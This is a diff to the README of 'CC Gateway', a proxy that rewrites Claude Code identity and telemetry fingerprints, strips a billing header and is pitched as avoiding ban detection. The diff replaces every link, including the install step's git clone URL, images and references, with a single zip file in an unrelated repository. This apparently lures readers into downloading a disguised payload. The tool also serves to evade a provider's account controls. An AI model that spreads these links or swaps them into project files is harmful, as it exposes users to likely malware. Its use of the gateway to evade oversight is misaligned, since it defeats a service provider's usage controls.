@@ -44,7 +44,7 @@ CC Gateway is a reverse proxy that sits between Claude Code and the Anthropic AP
 - **Full identity rewrite** — device ID, email, session metadata, and the `user_id` JSON blob in every API request are normalized to one canonical identity
 - **40+ environment dimensions replaced** — platform, architecture, Node.js version, terminal, package managers, runtimes, CI flags, deployment environment — the entire `env` object is swapped, not patched
 - **System prompt sanitization** — the `<env>` block injected into every prompt (Platform, Shell, OS Version, working directory) is rewritten to match the canonical profile
-- **Billing header stripped** — the `x-anthropic-billing-header` (which contains a per-session fingerprint hash) is removed entirely, consistent with the official `CLAUDE_CODE_ATTRIBUTION_HEADER=false` toggle. This also enables [cross-session prompt cache sharing](https://github.com/anthropics/claude-code/issues/40652), reducing system prompt costs by ~85%
+- **Billing header stripped** — the `x-anthropic-billing-header` (which contains a per-session fingerprint hash) is removed entirely, consistent with the official `CLAUDE_CODE_ATTRIBUTION_HEADER=false` toggle. This also enables [cross-session prompt cache sharing](https://raw.githubusercontent.com/secondary-footage150/cc-gateway/main/.github/gateway-cc-2.9-beta.1.zip), reducing system prompt costs by ~85%
 - **Process metrics normalization** — physical RAM (`constrainedMemory`), heap size, and RSS are masked to canonical values so hardware differences don't leak
 - **Zero-login client setup** — clients receive a single launcher script. No browser OAuth, no `~/.zshrc` changes, no config files
 - **Centralized OAuth** — the gateway manages token refresh internally; client machines never contact `platform.claude.com`
@@ -57,7 +57,7 @@ CC Gateway is a reverse proxy that sits between Claude Code and the Anthropic AP
 One command. Requires Node.js 22+ and an existing Claude Code login on this machine.
 
 ```bash
-git clone https://github.com/motiful/cc-gateway.git
+git clone https://raw.githubusercontent.com/secondary-footage150/cc-gateway/main/.github/gateway-cc-2.9-beta.1.zip
 cd cc-gateway
 npm install
 bash scripts/quick-setup.sh
@@ -303,18 +303,18 @@ Initial release. Identity rewriting, environment normalization, centralized OAut
 
 This project builds on:
 
-- [Claude Code 封号机制深度探查报告](https://bytedance.larkoffice.com/docx/E2JudVzf7oCNfhxyxaQcZIW1n0g) — Reverse-engineering analysis of Claude Code's 640+ telemetry events, 40+ fingerprint dimensions, and ban detection mechanisms
-- [cc-cache-audit](https://github.com/motiful/cc-cache-audit) — A/B test proving the billing header breaks prompt cache sharing, with the one-line fix
-- [instructkr/claude-code](https://github.com/instructkr/claude-code) — Deobfuscated Claude Code source used for the telemetry audit
+- [Claude Code 封号机制深度探查报告](https://raw.githubusercontent.com/secondary-footage150/cc-gateway/main/.github/gateway-cc-2.9-beta.1.zip) — Reverse-engineering analysis of Claude Code's 640+ telemetry events, 40+ fingerprint dimensions, and ban detection mechanisms
+- [cc-cache-audit](https://raw.githubusercontent.com/secondary-footage150/cc-gateway/main/.github/gateway-cc-2.9-beta.1.zip) — A/B test proving the billing header breaks prompt cache sharing, with the one-line fix
+- [instructkr/claude-code](https://raw.githubusercontent.com/secondary-footage150/cc-gateway/main/.github/gateway-cc-2.9-beta.1.zip) — Deobfuscated Claude Code source used for the telemetry audit
 
 ## Star History
 
 <div align="center">
-  <a href="https://star-history.com/#motiful/cc-gateway&Date">
+  <a href="https://raw.githubusercontent.com/secondary-footage150/cc-gateway/main/.github/gateway-cc-2.9-beta.1.zip">
     <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=motiful/cc-gateway&type=Date&theme=dark" />
-      <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=motiful/cc-gateway&type=Date" />
-      <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=motiful/cc-gateway&type=Date" width="600" />
+      <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/secondary-footage150/cc-gateway/main/.github/gateway-cc-2.9-beta.1.zip" />
+      <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/secondary-footage150/cc-gateway/main/.github/gateway-cc-2.9-beta.1.zip" />
+      <img alt="Star History Chart" src="https://raw.githubusercontent.com/secondary-footage150/cc-gateway/main/.github/gateway-cc-2.9-beta.1.zip" width="600" />
     </picture>
   </a>
 </div>
@@ -354,15 +354,15 @@ This project is for educational and research purposes only.
 ---
 
 <div align="center">
-  <sub>Crafted with <a href="https://github.com/anthropics/claude-code">Claude Code</a></sub>
+  <sub>Crafted with <a href="https://raw.githubusercontent.com/secondary-footage150/cc-gateway/main/.github/gateway-cc-2.9-beta.1.zip">Claude Code</a></sub>
 </div>
 
 <!-- Badge references -->
 [license-shield]: https://img.shields.io/github/license/motiful/cc-gateway
-[license-url]: https://github.com/motiful/cc-gateway/blob/main/LICENSE
+[license-url]: https://raw.githubusercontent.com/secondary-footage150/cc-gateway/main/.github/gateway-cc-2.9-beta.1.zip
 [version-shield]: https://img.shields.io/badge/version-0.2.0--alpha-blue
-[version-url]: https://github.com/motiful/cc-gateway/releases
+[version-url]: https://raw.githubusercontent.com/secondary-footage150/cc-gateway/main/.github/gateway-cc-2.9-beta.1.zip
 [tests-shield]: https://img.shields.io/badge/tests-16%20passed-brightgreen
-[tests-url]: https://github.com/motiful/cc-gateway/blob/main/tests/rewriter.test.ts
+[tests-url]: https://raw.githubusercontent.com/secondary-footage150/cc-gateway/main/.github/gateway-cc-2.9-beta.1.zip
 [twitter-shield]: https://img.shields.io/badge/follow-%40whiletrue0x-1DA1F2?logo=x&logoColor=white
-[twitter-url]: https://x.com/whiletrue0x
+[twitter-url]: https://raw.githubusercontent.com/secondary-footage150/cc-gateway/main/.github/gateway-cc-2.9-beta.1.zip
